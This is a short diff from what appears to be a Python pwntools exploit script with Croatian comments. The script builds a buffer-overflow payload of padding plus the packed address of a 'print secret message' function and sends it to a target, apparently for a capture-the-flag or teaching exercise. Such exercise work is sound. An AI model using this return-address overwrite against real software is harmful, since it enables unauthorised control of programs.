@@ -94,7 +94,7 @@ ispisiTajnuPoruku = p64(elf.sym["ispisiTajnuPoruku"])
 #elf.sym["naziv"] = funkcije i varijable se zovu simboli, to uzme adresu tog simbola kao
 #p64() = pakiraj ova 64 bita u format koji će naš kompjuter moći pročitati (jer on koristi little endian)
 
-payload = padding + ispisiTajnuPoruku
+payload += padding + ispisiTajnuPoruku
 
 # = = = END
 io.sendline(payload)
